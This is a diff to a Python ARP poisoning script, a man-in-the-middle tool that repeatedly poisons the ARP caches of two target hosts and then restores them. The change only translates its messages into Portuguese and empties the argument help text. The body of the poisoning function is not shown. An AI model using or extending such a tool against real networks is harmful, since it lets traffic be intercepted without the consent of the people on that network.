@@ -17,8 +17,8 @@ def stop_poison(target1, target2, target1MAC, target2MAC):
 
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument("ip",help="Enter the first target IP address")
-    parser.add_argument("ip2",help="Enter the second target IP address - leave blank for gateway", nargs="?")
+    parser.add_argument("ip",help="")
+    parser.add_argument("ip2",help="", nargs="?")
     args = parser.parse_args()
 
     target1 = args.ip
@@ -33,17 +33,17 @@ def main():
         target1MAC = str(getmacbyip(target1))
         target2MAC = str(getmacbyip(target2))
     except OSError:
-        print("Make sure you typed the IP adresses correctly")
+        print("Confirme se digitou o IP corretamente")
         sys.exit(1)
 
     try:
-        print("ARP poisoning started")
+        print("ARP poisoning iniciado")
         while True:
             poison(target1, target2, target1MAC)
             poison(target2, target1, target2MAC)
             time.sleep(1)
     except:
-        print("\nFinished ARP poisoning")
+        print("\nARP poisoning finalizado")
         stop_poison(target1, target2, target1MAC, target2MAC)
         stop_poison(target2, target1, target2MAC, target1MAC)
 
